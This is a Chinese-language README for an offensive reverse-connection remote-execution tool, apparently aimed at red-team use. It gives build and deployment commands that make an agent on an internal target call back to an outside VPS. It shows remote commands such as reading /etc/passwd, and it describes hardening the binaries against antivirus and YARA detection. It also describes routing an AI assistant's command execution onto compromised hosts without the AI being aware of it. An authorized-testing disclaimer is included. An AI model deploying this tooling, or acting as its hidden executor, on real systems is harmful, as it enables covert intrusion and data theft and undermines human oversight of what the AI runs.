# rtx — Reverse RPC Remote Executor

**[English](README_EN.md) | 中文**

一个 **反向 RPC 内网穿透执行器**：让本地的 AI / 终端像操作本地一样，在只有「已上线 agent」能访问的内网/隔离目标机器上执行命令、读写文件。

> ## ⚠️ 免责声明 / Disclaimer
>
> 本工具**仅限用于已授权的安全测试 / 红队演练 / CTF 竞赛 / 防御性安全研究与学习**。
> 使用者必须：
> - 事先取得目标系统所有者的**明确书面授权**；
> - 严格遵守测试授权范围与适用法律法规（如《网络安全法》《数据安全法》等）；
> - 对使用本工具造成的任何直接或间接后果自行承担全部责任。
>
> 作者不对任何未授权使用、滥用或违法行为负责。请勿将本工具用于任何非法目的。
> 如不同意以上条款，请勿下载、使用或分发本工具。

## 解决什么问题

打多层内网/隔离网络时，本机往往无法直接访问目标，只有已部署的内网机器（跳板）可达。传统做法是手动拼 `proxychains`、上传工具、来回搬运文件。rtx 把「在远程机器执行」变成一等能力：

```
本地（AI / 大脑）                  VPS（中转 server）              内网目标机器（agent）
  ├─ SSH 隧道 → 控制 API            ├─ 接收 agent 反连（公网）        ├─ reverse 回连
  └─ rtxctl / rtx_* 工具 ────────▶ └─ 任务路由 ──────────────────▶ └─ 原生命令执行
```

**设计要点**：
- **大脑在外部、执行器在内网**：API key / 模型推理不落地内网，内网 agent 不需要出网到模型 API
- **执行器 3MB 静态二进制**：Go 全标准库实现（零第三方依赖），Linux / Windows / macOS / ARM 全平台
- **Reverse RPC**：agent 主动回连，穿透 NAT 和多层隧道，断线自动重连（随机 jitter）
- **AI 无缝穿透**：可把 AI 的执行后端指向某台 agent——AI 无感知地在目标机器上执行

## 组件

| 组件 | 说明 |
|---|---|
| `agent` | 执行器：反连 server，执行 exec/read/write/list/info/upload/download/kill |
| `server` | 控制器：agent 注册管理 + 控制 HTTP API + 任务路由 |
| `rtx` | CLI：通过控制 API 派发任务 |
| `rtxctl` | 便捷封装：token 管理、默认 agent、enter/exit/connect（TUI 选节点） |
| `rtx_ui.py` | 节点连接选择器（仿 VS Code Remote 的 TUI） |
| `rtx_mcp_server.py` | Claude Code / MCP 客户端工具（rtx_ls/rtx_enter/rtx_exec/...） |

## 快速开始

```bash
# 构建（全标准库，无第三方依赖）
go build -ldflags="-s -w" -trimpath -o bin/server ./cmd/server
go build -ldflags="-s -w" -trimpath -o bin/rtx ./cmd/rtx
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o bin/agent-linux-amd64 ./cmd/agent

# 1. VPS 上起 server（中转控制器）
#    :9000 接收 agent 反连（公网，云安全组放行）；控制 API 仅绑 127.0.0.1
./server -l :9000 -t <强随机token> --ctrl 127.0.0.1:9001

# 2. 本地隧道接控制 API
ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>

# 3. 内网机器部署 agent（零依赖，上传即跑；多平台产物见 bin/）
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <唯一机器名> -q

# TLS 加密信道（v1.1，agent 直连公网时推荐）:
#   server 加 -tls → 自动生成证书并打印 pin(fp)；agent 加 -tls -pin <fp> 回连（证书指纹校验防中间人）
./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server打印的fp>

# 4. 本地操作（rtxctl 已封装 token/默认 agent）
rtxctl connect          # TUI 选节点 → 进入执行环境
rtxctl ls               # 在线 agent
rtxctl exec -cmd "whoami"
rtxctl read -path /etc/passwd
rtxctl upload -path /tmp/x -file ./本地
```

## 远程可达性场景

- 本机访问不到目标、上线 agent 可达 → 把 agent 部署到可达机器，AI 全部操作穿透到该机器
- 多层内网 → agent 经隧道端口映射 / socks5（`-proxy`）反连
- 无缝集成 AI → Claude Code MCP（`rtx_mcp_server.py`）或改 AI 工具后端指向 agent

## 构建产物

各平台均 ~3MB：darwin / linux-amd64 / linux-arm64 / windows-amd64 / windows-arm64
（`-ldflags="-s -w"` + CGO=0 + 全标准库）

## 安全

- 控制 API 仅绑定 127.0.0.1（本地经 SSH 隧道访问）
- agent 注册需 token 认证
- 行动注意：EDR 环境部署 agent 走合法通道；用后 kill + 清理残留

## Changelog / 更新记录

### v1.1（2026-09）
- **TLS 加密信道**：server `-tls` 自动生成自签证书并打印证书指纹（`pin(fp)`）；agent `-tls -pin <fp>` 回连，证书指纹校验防中间人/嗅探。直连公网 server 时建议启用（走已有加密隧道时可作纵深）。
- **静态特征加固**（降低 AV/YARA 签名命中面）：
  - module 路径中性化（`rtx` → 中性名），二进制不再暴露项目标识
  - 关键字符串异或混淆运行时解密（shell 路径 / 错误串 / 协议标记等）
  - flag 帮助文本静默化（`-h`/参数错误不再输出说明）
- **文档**：新增 `OPSEC-EVASION.md`（PEN-200/OSEP 检测原理 + 加固手册）、`README_EN.md`（英文版）

### v1.0（初始）
- 反向 RPC 执行器：agent / server / rtx CLI / rtxctl / rtx_ui（TUI 节点选择）
- 多平台静态二进制（linux/windows/darwin, amd64/arm64）

## Credits / 致谢

- 感谢 [lanyi1998](https://github.com/lanyi1998) —— 本项目 `rtxctl connect` 的连接选择器界面灵感来自其 [pi-remote](https://github.com/lanyi1998/pi-remote) 项目（Saved remote connections 交互范式）。

## License

MIT
